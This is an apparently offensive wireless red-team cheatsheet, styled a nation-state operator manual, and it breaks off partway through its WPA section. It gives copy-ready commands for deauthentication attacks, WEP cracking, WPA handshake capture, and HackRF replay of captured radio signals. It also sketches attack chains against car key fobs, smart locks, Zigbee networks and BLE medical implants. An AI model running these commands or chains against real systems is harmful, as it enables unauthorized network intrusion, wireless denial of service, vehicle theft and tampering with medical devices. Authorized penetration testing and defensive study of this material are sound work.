# Wireless Red Team & Penetration Testing — Nation-State Operator Field Manual

> **Classification:** End-to-end operational reference for wireless red team engagements. Covers Wi-Fi (WEP/WPA/WPA2/WPA3/WPA3-Enterprise/OWE/6 GHz/Wi-Fi 7), Bluetooth Classic & BLE (incl. 5.4+/LE Audio/Auracast), Apple AWDL/Continuity, Zigbee/Z-Wave/Thread/Matter, RFID/NFC, SDR, cellular (GSM/4G/5G SA), LoRa, automotive RF (rolling-code/RollBack/Tesla BLE relay), and stalkerware detection.
>
> **Environment baseline:** Modern enterprise wireless — Wi-Fi 6/6E/7 deployments with **WPA3 + PMF mandatory on 6 GHz**; iOS 14+/Android 12+ MAC randomization default; modern WIDS/WIPS (**Cisco DNA Center, Aruba ClearPass, Mist AI, Meraki Air Marshall**) with cloud-side correlation; 802.1X + EAP-TLS with NAC + cert validation increasingly common; BLE 5.4+ device fleet; Bluetooth-pairing-by-numerical-comparison default.
>
> **Wireless-engagement OPSEC taxonomy:** Each technique rated on:
> - **STEALTH** (LOW / MEDIUM / HIGH / VERY HIGH) — detectability by WIDS/WIPS
> - **SUCCESS RATE** (LOW / MED / HIGH) — typical engagement outcome against modern baseline
> - **SKILL** (LOW / MEDIUM / HIGH / VERY HIGH) — operator expertise required
> - **DETECTION COST** (NEAR-ZERO / LOW / MEDIUM / HIGH) — defender attention cost on activation
> - **LEGAL** (GREEN / YELLOW / RED) — regulatory exposure (RF jamming, GSM transmit, GPS spoof are RED without explicit authorization)
>
> **Scope note:** This document covers the RF spectrum exclusively. Once an operator has authenticated to a wireless network, downstream activity (IP/TCP/network/web-layer attacks, lateral movement, credential pivoting) belongs in the lateral movement (file 06), web application (file 09), or initial access (file 03) cheatsheets. Wireless attack chains in §0.4 stop at RF foothold and cross-reference outward.

---

## Table of Contents

- [0 — Environment Setup & Hardware](#phase-0--environment-setup--hardware)
- [1 — Wireless Reconnaissance](#phase-1--wireless-reconnaissance)
- [2 — Wi-Fi Attacks](#phase-2--wi-fi-attacks)
- [3 — Bluetooth Attacks](#phase-3--bluetooth-attacks)
- [4 — RFID & NFC Attacks](#phase-4--rfid--nfc-attacks)
- [5 — SDR & RF Attacks](#phase-5--sdr--rf-attacks)
- [6 — Zigbee & IoT Protocol Attacks](#phase-6--zigbee--iot-protocol-attacks)
- [7 — Wireless Jamming & RF Denial of Service](#phase-7--wireless-jamming--rf-denial-of-service)
- [8 — Specialized Wireless Attacks](#phase-8--specialized-wireless-attacks)
- [9 — Reporting & Evidence](#phase-9--reporting--evidence)
- [10 — Tool Quick Reference (Maintenance Status)](#10--tool-quick-reference-maintenance-status)
- [11 — Defender Stack Reference (Wireless)](#11--defender-stack-reference-wireless)
- [12 — MITRE ATT&CK Mapping Matrix](#12--mitre-attck-mapping-matrix)
- [13 — Quick Reference Tables](#13--quick-reference-tables)

---

### Support This Work

If these cheatsheets save you time, consider buying me a coffee.

<a href="https://www.buymeacoffee.com/NoVanity" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>

**Or scan:**

<img src="https://github.com/MentalVibes/RedTeamCheatSheets/blob/4077a94d94806ba6e6513c29e1410bcda23894d1/qr-code.png" alt="Buy Me A Coffee QR" width="200">

**Crypto:**

| Currency | Address |
|----------|---------|
| **ETH** | `0x3844c08bb832b086d00dbbfec128cb31bdcca838` |

*Accepts ETH, USDC, and any ERC-20 token on Ethereum, Base, Polygon, and other EVM chains.*

---

## PHASE 0 — ENVIRONMENT SETUP & HARDWARE

### 0.1 Required Hardware

```
┌─────────────────────────────────────────────────────────────────────┐
│ HARDWARE                 │ PURPOSE                │ APPROX COST    │
├─────────────────────────────────────────────────────────────────────┤
│ Alfa AWUS036ACH/ACS      │ Wi-Fi monitor/inject   │ $50-70         │
│ Alfa AWUS036AXML         │ Wi-Fi 6E support (6GHz)│ $80            │
│ Alfa AWUS036AXER         │ Wi-Fi 7 / 802.11be 6GHz│ $90-110        │
│ WiFi Pineapple Mark VII  │ Rogue AP / Evil Twin   │ $100-300       │
│   Mark VII NEO (2024)    │ Wi-Fi 6 + faster CPU   │ $200-400       │
│   Pineapple Enterprise   │ 2025 — operator-grade  │ $500-1000      │
│ ESP32 Marauder (firmware)│ $10 Wi-Fi/BT attack    │ $10-20         │
│ ESP32-S3 + Marauder fw   │ Modern dual-band ESP32 │ $15-30         │
│ Ubertooth One            │ Bluetooth sniffing     │ $120           │
│ HackRF One               │ SDR 1MHz-6GHz          │ $300           │
│ PortaPack H4M            │ Portable SDR + HackRF  │ $150-200       │
│ RTL-SDR v3/v4            │ SDR receive 24-1766MHz │ $25-35         │
│ Proxmark3 RDV4           │ RFID/NFC read/write    │ $300           │
│ Chameleon Ultra          │ RFID/NFC emulation     │ $70            │
│ Flipper Zero             │ Multi-protocol         │ $170           │
│ CC2531 USB Dongle        │ Zigbee sniffing        │ $10            │
│ nRF52840 USB Dongle      │ BLE sniffing/inject    │ $10            │
│ Yard Stick One           │ Sub-GHz RF TX/RX       │ $100           │
│ Crazyradio PA            │ MouseJack/nRF24 attack │ $30            │
│ Raspberry Pi 4/5         │ Portable attack box    │ $35-80         │
│ GPS antenna/module       │ Wardriving geolocation │ $15-30         │
│ High-gain directional    │ Long-range Wi-Fi/RF    │ $20-50         │
│  antenna (Yagi/panel)    │                        │                │
│ SMA adapters/pigtails    │ Antenna connections    │ $5-15          │
└─────────────────────────────────────────────────────────────────────┘
```

### 0.2 Operating System & Core Software Setup

```bash
# === KALI LINUX (Primary Platform) ===
# Download: https://www.kali.org/get-kali/
# Contains most wireless tools pre-installed

# Update everything
sudo apt update && sudo apt full-upgrade -y

# === INSTALL CORE WIRELESS TOOLS ===
sudo apt install -y \
  aircrack-ng \
  bettercap \
  wireshark \
  tshark \
  kismet \
  hostapd \
  dnsmasq \
  hcxdumptool \
  hcxtools \
  hashcat \
  john \
  mdk4 \
  wifite \
  reaver \
  bully \
  pixiewps \
  fern-wifi-cracker \
  cowpatty \
  asleap \
  macchanger \
  rfkill \
  bluez \
  bluez-tools \
  ubertooth \
  gnuradio \
  gqrx-sdr \
  inspectrum \
  rtl-sdr \
  multimon-ng \
  kalibrate-rtl \
  gr-osmosdr \
  nmap \
  tcpdump \
  ettercap-common \
  crunch \
  wordlists

# === INSTALL FROM SOURCE / PIP ===
# EAPHammer (WPA-Enterprise attacks)
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer && sudo ./kali-setup

# hostapd-wpe ⚠ STALLED (~2018) — broken on modern Kali
# git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
# Build process broken on modern Kali (libnl3 incompatibility);
# OpenSecurityResearch repo has not been touched since 2018.
# 2026 OPERATOR REALITY: Use eaphammer (primary, below) OR
# berate_ap (sensepost, also below) which carry equivalent
# functionality with active maintenance.
# Only path to current hostapd-wpe-style operation: patch
# current hostapd source manually with adapted WPE patch
# (community fork: github.com/aircrack-ng/hostapd-wpe — periodic
# resync attempts; verify before relying)
sudo apt install hostapd-wpe 2>/dev/null || echo "Use eaphammer or berate_ap instead — see Phase 2.4"

# Wifipumpkin3 (Rogue AP framework)
sudo apt install wifipumpkin3
# OR from source:
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3 && sudo python3 setup.py install

# Fluxion (Social engineering Wi-Fi)
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && sudo ./fluxion.sh

# hcxdumptool + hcxtools (PMKID & handshake capture)
sudo apt install hcxdumptool hcxtools
# OR latest from source:
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool && make && sudo make install
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools && make && sudo make install

# Bettercap (Swiss-army knife)
sudo apt install bettercap
# Update caplets:
sudo bettercap -eval "caplets.update; q"

# KillerBee (Zigbee attacks)
pip install pyusb crypto
git clone https://github.com/riverloopsec/killerbee.git
cd killerbee && sudo python3 setup.py install

# Bleak (BLE Python — cross-platform — PRIMARY CHOICE 2026)
pip install bleak
# Modern asyncio-based BLE library; supports Linux/macOS/Windows;
# active maintenance; replaces dead BluePy.

# BluePy ❌ DEAD — DO NOT USE
# pip install bluepy   # Last release 2020; no Python 3.12+ wheels;
#                      # broken on modern Kali. Use Bleak instead.

# simplepyble (alternative cross-platform BLE)
pip install simplepyble

# BTLE-Juice ⚠ STALLED (~2017) — DO NOT USE FOR NEW WORK
# npm install -g btlejuice
# Project abandoned ~2017; modern btlejack (micro:bit-based,
# below) is the operational replacement for BLE MITM/sniffing.

# btlejack (micro:bit-based BLE sniffer + MITM — MAINTAINED)
pip install btlejack

# Universal Radio Hacker (signal analysis)
pip install urh
# OR: sudo apt install urh

# Proxmark3 client
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3 && make clean && make all
# Flash firmware:
./pm3-flash-all
```

### 0.3 Wi-Fi Adapter Setup & Verification

```bash
# === CHECK ADAPTER CAPABILITIES ===
# List wireless interfaces
iwconfig
iw dev
ip link show

# Check chipset and driver
lsusb                                 # USB adapters
lspci                                 # PCIe adapters
sudo airmon-ng                        # Show interfaces with driver/chipset

# Check monitor mode and injection support
iw list | grep -A10 "Supported interface modes"
# Should show: monitor, AP, mesh point

# Test packet injection
aireplay-ng --test wlan0

# === DRIVER INSTALLATION (if needed) ===
# Realtek RTL8812AU/RTL8814AU (common for Alfa adapters):
sudo apt install realtek-rtl88xxau-dkms
# OR from source:
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms_install

# === ENABLE MONITOR MODE ===
# Method 1: airmon-ng (recommended)
sudo airmon-ng check kill             # Kill interfering processes
sudo airmon-ng start wlan0            # Creates wlan0mon
# Verify:
iwconfig wlan0mon                     # Mode:Monitor

# Method 2: iw (manual)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Method 3: Specific channel
sudo airmon-ng start wlan0 6          # Monitor on channel 6

# === MAC ADDRESS SPOOFING ===
sudo airmon-ng stop wlan0mon
sudo macchanger -r wlan0              # Random MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # Specific MAC
sudo macchanger -s wlan0              # Show current MAC
sudo airmon-ng start wlan0

# === RFKILL (if wireless is blocked) ===
rfkill list                           # Show blocked interfaces
sudo rfkill unblock all               # Unblock everything
```

### 0.4 Wireless Engagement Chains (Operator Sequencing)

```
═══════════════════════════════════════════════════════════
TYPICAL WIRELESS ENGAGEMENT CHAINS
═══════════════════════════════════════════════════════════

CORPORATE Wi-Fi RF FOOTHOLD:
  Recon (passive airodump-ng + Kismet) → identify SSID/encryption →
  if WPA2-PSK with weak passphrase: PMKID capture (hcxdumptool) →
  hashcat crack → RF foothold complete.
  If WPA2-Enterprise: EAPHammer evil-twin → MSCHAPv2 challenge capture
  → hashcat -m 5500 → cracked credentials.
  If WPA3-only with H2C: pivot to evil-twin captive portal (§2.3) or
  EAPHammer if Enterprise.
  STOP — once authenticated, downstream lateral movement / wired-side
  pivoting / credential reuse against AD / VPN belongs in lateral
  movement cheatsheet (file 06).

GUEST-Wi-Fi RF FOOTHOLD:
  Connect to OPEN or OWE guest network → RF foothold complete.
  Downstream VLAN hopping, segmentation evaluation, trunk negotiation,
  cross-VLAN pivoting are wired/network-layer activity covered in
  lateral movement cheatsheet (file 06).

WPA3-ONLY ENVIRONMENT — SOCIAL ENGINEERING PATH:
  Recon shows WPA3-SAE only (no transition mode) → offline cracking
  not viable → operator path: open evil twin with captive portal
  spoofing legitimate Wi-Fi vendor login (Cisco Umbrella, Cloudflare
  WARP, etc.) → user enters Wi-Fi password thinking it's a portal.
  Fluxion / Wifipumpkin3 automate this. Works against ANY encryption
  level — SE bypasses crypto entirely.

IoT ECOSYSTEM COMPROMISE (consumer/SOHO):
  Sub-GHz RF recon (rtl_433) → identify smart locks / garage door /
  weather station → if Z-Wave: capture S0 inclusion → recover network
  key. If Zigbee: zbstumbler → capture pairing → ZLL master key (2015
  leak) → decrypt + control. If 433MHz dumb device: hackrf_transfer
  capture → urh analyze → replay.

AUTOMOTIVE ENGAGEMENT (modern car keys):
  Identify FOB frequency (315/433MHz) + encoding (rolling code most
  modern vehicles) → if Tesla or similar BLE-based: BLE relay (Khan/
  Bednarski 2022 pattern, requires 2x phone-equivalent devices) →
  if KIA/Hyundai: USB CAN injection (KIA Boys 2022-2024) →
  if Honda/Toyota: RollBack (CVE-2022-27254) capture two consecutive
  rolling codes → resync → replay. Cross-ref §4.4.

BLE MEDICAL DEVICE / IMPLANT ASSESSMENT:
  Bleak BLE scan → enumerate GATT services → identify proprietary
  service UUIDs → fuzz writable characteristics → capture pairing
  via micro:bit btlejack → if legacy pairing: crackle offline crack.
  Often produces FDA-class-relevant findings.

APPLE-HEAVY ENTERPRISE — AWDL / CONTINUITY:
  Recon Apple device fleet via BLE Continuity advertisements (Hexway
  Reveal pattern reveals Apple ID hash + nearby devices) → AWDL
  channel sniffing for AirDrop activity → if vulnerable iOS version:
  exploit chain (cross-ref §3.3 AWDL Project Zero research).

TSCM / COUNTER-SURVEILLANCE:
  Spectrum sweep (HackRF + RTL-SDR) 1MHz-6GHz → identify constant
  transmitters / burst patterns → narrow to physical location with
  directional antenna → BLE scan for AirTags / Tile / SmartTag in
  vehicle / luggage / personal effects → AirGuard (Android) or Apple
  Tracker Detect. Cross-ref §8.2.2.

ENGAGEMENT PRECONDITIONS (LEGAL/AUTHORIZATION CHECK):
- WRITTEN ROE specifying frequencies / SSIDs / locations / times
- For RF transmit (jamming, GPS spoof, GSM): explicit FCC/Ofcom
  authorization OR Faraday cage environment
- For automotive: vehicle owner's WRITTEN consent + on-property only
- For BLE/Wi-Fi capture in mixed-tenant spaces: notify property mgmt
- IMSI catcher / cellular base-station emulation: nearly always
  illegal without telecom-licensed environment
```

---

## PHASE 1 — WIRELESS RECONNAISSANCE

### 1.1 Passive Wi-Fi Scanning

```bash
# === AIRODUMP-NG (Primary Scanner) ===
# Scan all channels, all bands:
sudo airodump-ng wlan0mon

# Scan specific band:
sudo airodump-ng wlan0mon --band a      # 5GHz only
sudo airodump-ng wlan0mon --band bg     # 2.4GHz only
sudo airodump-ng wlan0mon --band abg    # All bands

# Target specific network:
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon

# Output formats:
sudo airodump-ng wlan0mon -w scan_results --output-format csv,pcap,kismet

# Filter by encryption:
sudo airodump-ng wlan0mon --encrypt WEP
sudo airodump-ng wlan0mon --encrypt WPA
sudo airodump-ng wlan0mon --encrypt WPA2
sudo airodump-ng wlan0mon --encrypt WPA3
sudo airodump-ng wlan0mon --encrypt OPN   # Open networks

# Show WPS status:
sudo airodump-ng wlan0mon --wps

# === KISMET (Advanced Passive Recon) ===
sudo kismet -c wlan0mon
# Web UI: http://localhost:2501
# Captures: Wi-Fi, Bluetooth, Zigbee, RF metadata
# Output:
kismet -c wlan0mon --log-types kismet,pcapng

# === HCXDUMPTOOL (PMKID + Handshake capture) ===
# Passive + active scanning:
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=15
# Filter specific BSSID:
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2

# === WARDRIVING ===
# Kismet + GPS (gpsd):
sudo apt install gpsd gpsd-clients
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
sudo kismet -c wlan0mon
# Generates KML/KMZ files for Google Earth mapping

# Wigle WiFi (Android app) for quick mobile wardriving
# Export results to Wigle.net database

# === IDENTIFY HIDDEN SSIDS ===
# Airodump shows hidden as <length: X>
# Wait for client probe requests, or:
sudo aireplay-ng -0 5 -a <AP_BSSID> wlan0mon    # Deauth → client reconnects revealing SSID
# OR use mdk4:
sudo mdk4 wlan0mon p -t <AP_BSSID>              # Probe for hidden SSID

# === PROBE REQUEST HARVESTING ===
# Capture devices broadcasting saved network names:
sudo airodump-ng wlan0mon                        # "Probes" column
# Or with tshark:
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" \
  -T fields -e wlan.sa -e wlan_mgt.ssid | sort -u

# ★ MAC RANDOMIZATION REALITY (2026 — critical operator caveat) ★
# iOS 14+ and Android 12+ default to PER-NETWORK randomized MACs:
# - Probe requests use one-time random MACs (not persistent device MAC)
# - Connected clients use a stable per-SSID random MAC (different per
#   network they connect to)
# - Effect on operator: "track devices via probe request MAC" is
#   LARGELY DEAD against modern smartphones; persistent SSID lists
#   still leak (probes contain saved SSIDs even when MAC is random)
#
# WHAT STILL WORKS:
# - SSID list as device fingerprint (pattern of saved networks is
#   often device-unique)
# - IE (Information Element) fingerprinting in probe requests —
#   Wi-Fi vendor + chipset signatures persist across MAC randomization
# - Continuity / Apple Wireless metadata in BLE advertisements
#   (separate radio, separate randomization regime — Hexway Reveal)
# - Legacy IoT devices (smart TVs, printers, IP cameras) — most
#   still use persistent burned MAC
#
# IE-BASED FINGERPRINTING (modern recon):
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" \
  -T fields -e wlan.sa -e wlan.tag.vendor.oui.id \
  -e wlan.htex.capabilities -e wlan.vht.capabilities | sort -u
# Vendor IE + HT/VHT capabilities = device-class fingerprint
# Bettercap wifi.recon includes this automatically

# === CLIENT ENUMERATION ===
# Identify connected clients and their associations:
sudo airodump-ng -c <channel> --bssid <AP_MAC> wlan0mon
# STATION column shows connected clients
# Probes column shows other networks they know
```

### 1.2 Active Wi-Fi Recon (RF-side only)

```bash
# Scope note: post-association IP/TCP enumeration (nmap, web-UI fingerprinting
# of AP management interface, etc.) belongs in lateral movement / initial access
# cheatsheets. This subsection covers RF-layer active recon only.

# === WPS SCANNING ===
# wash (part of reaver):
sudo wash -i wlan0mon                 # List WPS-enabled APs
sudo wash -i wlan0mon -5              # 5GHz band
# Output shows: WPS version, locked status, BSSID, SSID

# === IDENTIFY AP VENDOR FROM RF-SIDE METADATA ===
# From MAC OUI in beacon source-address:
# First 3 octets → manufacturer lookup
# https://macvendors.com/
# Common: Cisco (00:0C:85), Aruba (00:0B:86), Ubiquiti (FC:EC:DA), Ruckus (C4:01:7C)

# Vendor-specific Information Elements (IEs) in beacon frames identify
# AP family + chipset. Visible without authentication:
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype==8" \
  -T fields -e wlan.sa -e wlan.tag.vendor.oui.id \
  -e wlan.tag.vendor.data | sort -u

# === IDENTIFY ENTERPRISE INFRASTRUCTURE (RF capture) ===
# Capture EAP packets — protocol type reveals authentication method:
sudo tshark -i wlan0mon -Y "eap" -T fields \
  -e wlan.sa -e eap.type -e eap.identity
# EAP types: 13=TLS, 21=TTLS, 25=PEAP, 55=TEAP (RFC 7170, increasingly common)
# RADIUS server identity and cert details visible during EAP negotiation
```

### 1.3 Bluetooth Reconnaissance

```bash
# === CLASSIC BLUETOOTH SCANNING ===
# Using BlueZ tools:
sudo hciconfig hci0 up               # Enable adapter
sudo hciconfig hci0 piscan           # Make discoverable (for testing)
hcitool scan                          # Discover devices (inquiry)
hcitool scan --flush                  # Clear cache first
hcitool inq                           # Raw inquiry scan

# Extended info:
hcitool info <BT_ADDR>               # Device name, class, features
hcitool name <BT_ADDR>               # Just the name

# Service discovery:
sdptool browse <BT_ADDR>             # All SDP services
sdptool search SP <BT_ADDR>          # Serial Port Profile
sdptool search OPUSH <BT_ADDR>       # Object Push
sdptool search FTP <BT_ADDR>         # File Transfer
sdptool records <BT_ADDR>            # Full service records

# Using bluetoothctl (interactive):
bluetoothctl
  power on
  scan on                             # Start discovery
  devices                             # List found devices
  info <BT_ADDR>                      # Device details
  pair <BT_ADDR>                      # Attempt pairing
  connect <BT_ADDR>                   # Connect
  scan off
  exit

# === BLE SCANNING ===
# hcitool:
sudo hcitool lescan                   # BLE scan
sudo hcitool lescan --duplicates      # Include repeated advertisements

# bluetoothctl:
bluetoothctl
  menu scan
  transport le                        # BLE only
  back
  scan on
  # Wait for devices...
  scan off

# Using bettercap:
sudo bettercap
  ble.recon on                        # Start BLE scanning
  ble.show                            # List discovered devices
  ble.enum <BLE_ADDR>                 # Enumerate services/characteristics

# Using nRF Connect (Android/iOS app) - excellent for BLE recon

# === UBERTOOTH (Advanced BT sniffing) ===
# Spectrum analysis:
ubertooth-specan -G                   # Launch spectrum analyzer GUI

# Capture BLE advertisements:
ubertooth-btle -f -c capture.pcap    # Follow connections

# Capture specific connection:
ubertooth-btle -t <BLE_ADDR>         # Target specific device

# Follow all BLE connections:
ubertooth-btle -p                     # Promiscuous mode

# Classic Bluetooth LAP capture:
ubertooth-btbb -l                     # Capture LAPs

# === PASSIVE BLUETOOTH TRACKING ===
# BlueHydra ❌ DEAD — Pwnie Express defunct; repo archived;
# Ruby dependency hell on modern systems. DO NOT USE.
#
# 2026 OPERATOR ALTERNATIVES (active passive-BT detection):
# 1. Kismet with Bluetooth plugin (PRIMARY):
sudo kismet -c hci0 -c wlan0mon
# Kismet captures: classic BT, BLE, Wi-Fi simultaneously,
# correlates devices, exports KML for geolocation
#
# 2. bettercap ble.recon (modern, scriptable):
sudo bettercap -iface hci0
ble.recon on
ble.show
#
# 3. Sniffle (Sultan Qasim Khan / NCC Group — TI CC1352-based):
git clone https://github.com/nccgroup/Sniffle
# Best-in-class BLE 5 sniffer (BLE 4.x + 5.x + Coded PHY)
# Hardware: Sonoff CC1352P2-2 dongle (~$30) flashed with Sniffle fw
sniff_receiver.py -i 0 -c 37 -e
#
# 4. Apple Wireless / Continuity recon (Hexway Reveal pattern):
# Apple devices broadcast Continuity advertisements with metadata
# beyond what standard BLE recon shows — partial Apple ID hash,
# nearby device count, AirDrop state, AirPods battery, etc.
# Tool: nrf-ble-sniffer + appleble.py decoder; or AirGuard

# btmon (HCI packet logging — built-in BlueZ tool, always works):
sudo btmon -w bluetooth_capture.log
# Open in Wireshark: wireshark bluetooth_capture.log
```

### 1.4 RF & SDR Reconnaissance

```bash
# === RTL-SDR (Receive-Only Scanner) ===
# Scan spectrum:
rtl_power -f 70M:1700M:1M -g 50 -i 1 -e 1h survey.csv
# Visualize:
heatmap.py survey.csv survey.png

# Real-time spectrum:
gqrx                                  # GUI spectrum analyzer
# OR:
qspectrumanalyzer                     # Multiple backend support

# === HACKRF ONE ===
# Check hardware:
hackrf_info                           # Verify connected

# Sweep spectrum (outputs to stdout in CSV-like format):
hackrf_sweep -f 1:6000 -w 100000 -l 32 -g 30 -a 1 > sweep_results.csv
# 1MHz to 6GHz sweep
# Visualize with: QSpectrumAnalyzer (built-in hackrf_sweep backend)

# Receive and record raw IQ:
hackrf_transfer -r capture.raw -f 433920000 -s 2000000 -g 40 -l 32
# -f frequency in Hz, -s sample rate, -g RF gain, -l IF gain

# Transmit recorded signal (REPLAY ATTACK):
hackrf_transfer -t capture.raw -f 433920000 -s 2000000 -x 40 -a 1
# -x TX VGA gain, -a antenna enable

# === PORTAPACK H4M (Standalone HackRF) ===
# Runs Mayhem firmware - no computer needed
# Features: spectrum analyzer, audio receiver, replay, GPS sim
# Navigate menus on device for:
# - Receive → scan frequencies
# - Capture → record IQ data
# - Replay → transmit captured signals
# - Microphone TX → FM transmit

# === GNU RADIO (Signal Processing) ===
gnuradio-companion                    # Launch GUI
# Build flowgraphs for:
# - Custom demodulation
# - Signal capture and replay
# - Protocol analysis
# - Jamming (authorized testing only)

# === UNIVERSAL RADIO HACKER (URH) ===
urh                                   # Launch GUI
# Features:
# - Record signals from SDR
# - Auto-detect modulation (ASK/OOK, FSK, PSK)
# - Demodulate and decode
# - Protocol analysis
# - Signal generation and replay

# === IDENTIFY UNKNOWN SIGNALS ===
# 1. Capture with SDR
# 2. View in GQRX/SDR# for frequency and bandwidth
# 3. Analyze modulation in URH or inspectrum
inspectrum capture.raw                # Visual signal analysis
# 4. Reference: sigidwiki.com for signal identification
```

### 1.5 — 6 GHz Band Recon (Wi-Fi 6E) — NEW

```bash
# ════════════════════════════════════════════════════════════
# 6 GHz BAND (5.925-7.125 GHz) — WI-FI 6E
# Regulatory: Unlicensed since 2020-2024 (varies by region)
# CRITICAL: WPA3 + PMF MANDATORY by spec on 6 GHz (no WPA2 allowed)
# STEALTH: HIGH (fewer monitoring tools support it) | LEGAL: GREEN
# ════════════════════════════════════════════════════════════

# HARDWARE REQUIREMENT — 6 GHz capable adapter:
# - Alfa AWUS036AXML (Wi-Fi 6E)
# - Alfa AWUS036AXER (Wi-Fi 7 — covers 6 GHz also)
# - Intel AX210 / AX211 / BE200 (laptop NICs — driver-dependent)

# CHECK ADAPTER 6 GHz SUPPORT:
iw list | grep -i "6 GHz" -A5
# Should show channels 1-233 in 6 GHz section

# ENABLE 6 GHz SCAN:
sudo iw dev wlan0 scan freq 5955 6035 6115 6195 6275 6355 6435 6515 6595
# Or simpler — let kernel scan all bands:
sudo iw dev wlan0 scan | grep -E "freq:|SSID:|signal:"

# 6 GHz CHANNEL PLAN (US — channels 1-233):
# Channel 1   = 5955 MHz
# Channel 5   = 5975 MHz
# Channel 9   = 5995 MHz
# ... (20 MHz channels every 4 numbers)
# 80 MHz: channels 7, 23, 39, 55, 71, 87, 103, 119
# 160 MHz: channels 15, 47, 79, 111, 143, 175, 207
# 320 MHz (Wi-Fi 7 only): channels 31, 95, 159

# AIRODUMP-NG with 6 GHz:
sudo airodump-ng wlan0mon --band 6   # Some recent forks support
# OR use newer band syntax:
sudo airodump-ng wlan0mon --band a   # 5 GHz + 6 GHz mixed

# WHAT YOU'LL SEE ON 6 GHz:
# - Only WPA3-SAE encrypted networks (regulatory)
# - PMF (802.11w) mandatory — no deauth attacks viable
# - Discovery via Reduced Neighbor Reports (RNR) IE in 2.4/5 GHz
#   beacons (out-of-band discovery)
# - SSID hidden by default in many enterprise 6 GHz deployments
# - Out-of-band probing required for hidden 6 GHz APs
# - Power constraints (LPI / SP / VLP) limit transmit power vs 5 GHz

# OPERATOR REALITY:
# - 6 GHz = forced WPA3 + forced PMF = no WPA2 attack toolkit
#   applies; no deauth-based attacks; only attack surfaces are
#   transition-mode misconfigs, evil twin SE, and Dragonblood-class
#   research-grade attacks
# - Many enterprise 6 GHz deployments mix 5 GHz WPA2 + 6 GHz WPA3
#   on same SSID — clients downgrade to 5 GHz when 6 GHz unavailable
#   = transition-mode-equivalent attack surface still exists
# - WIDS/WIPS on 6 GHz still maturing; less monitoring noise
```

### 1.6 — Wi-Fi 7 / 802.11be MLO Recon — NEW

```bash
# ════════════════════════════════════════════════════════════
# WI-FI 7 (802.11be) — Ratified Q1 2024
# KEY FEATURE: Multi-Link Operation (MLO) — single client uses
# 2.4 + 5 + 6 GHz bands SIMULTANEOUSLY for one logical association
# ════════════════════════════════════════════════════════════

# IDENTIFY WI-FI 7 APs:
sudo airodump-ng wlan0mon
# Wi-Fi 7 indicators:
# - 320 MHz channel width (6 GHz only, channels 31/95/159)
# - 4096-QAM modulation (vs 1024-QAM for Wi-Fi 6E)
# - MLO advertised in beacon Multi-Link Element (IE 107)
# - EHT (Extremely High Throughput) IE present

# MLO ATTACK SURFACE — operational implications:
# - Client maintains parallel links across bands; if one band has
#   weaker security posture (5 GHz with WPA2 vs 6 GHz with WPA3),
#   operator can target the weaker link
# - MLO downgrade attack: force client to drop 6 GHz link, fall
#   back to 5 GHz where WPA2 + deauth attacks viable
# - Cross-band session hijacking: 4-way handshake derives PTK
#   bound to all links; single-link compromise can affect MLO
#   session state
# - CVE-2024-30078 (Intel Wi-Fi RCE, June 2024) — affects Intel
#   AX/BE drivers; pre-authentication RCE via crafted beacon;
#   relevant to any Wi-Fi 7 target with Intel NIC
#   Source: https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-01038.html

# OPERATOR DECISION TREE FOR WI-FI 7:
# - Target uses MLO with ALL bands WPA3? → Social engineering only
# - Target uses MLO with 5 GHz WPA2 fallback? → Force fallback,
#   attack 5 GHz layer
# - Target Intel-NIC client unpatched June 2024? → CVE-2024-30078
#   beacon attack feasible

# RECON TOOLING STATE:
# - Wireshark 4.2+ supports 802.11be IE parsing
# - hcxdumptool 6.4+ supports 320 MHz channel width
# - aircrack-ng 1.7+ supports basic 802.11be capture
# - Many tools still catching up — operator may need to roll
#   custom decoder for new IE types
```

---

## PHASE 2 — WI-FI ATTACKS

### 2.1 WEP Cracking (Legacy Networks)

```bash
# WEP is broken and rare, but still found in industrial/legacy environments

# Step 1: Target WEP network
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w wep_capture wlan0mon

# Step 2: Generate traffic (ARP replay)
# Fake auth first:
sudo aireplay-ng -1 0 -a <AP_MAC> -h <YOUR_MAC> wlan0mon
# ARP replay:
sudo aireplay-ng -3 -b <AP_MAC> -h <YOUR_MAC> wlan0mon
# Wait for #Data to reach 20,000-40,000+ IVs

# Alternative: chopchop attack
sudo aireplay-ng -4 -b <AP_MAC> -h <YOUR_MAC> wlan0mon
# Fragment attack:
sudo aireplay-ng -5 -b <AP_MAC> -h <YOUR_MAC> wlan0mon

# Step 3: Crack the key
sudo aircrack-ng wep_capture-01.cap
# Usually cracks with 20,000+ IVs in seconds

# PTW attack (faster, needs fewer IVs):
sudo aircrack-ng -z wep_capture-01.cap

# Step 4: Connect with cracked key
sudo iwconfig wlan0 mode managed
sudo iwconfig wlan0 essid "TARGET" key s:<WEP_KEY>
sudo dhclient wlan0
```

### 2.2 WPA/WPA2-PSK Attacks

```bash
# ============================================
# METHOD 1: 4-WAY HANDSHAKE CAPTURE + CRACK
# ============================================

# Step 1: Capture handshake
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w wpa_capture wlan0mon

# Step 2: Deauthenticate client to force reconnect
# Single client:
sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
# All clients:
sudo aireplay-ng -0 10 -a <AP_MAC> wlan0mon
# Using mdk4 (more options):
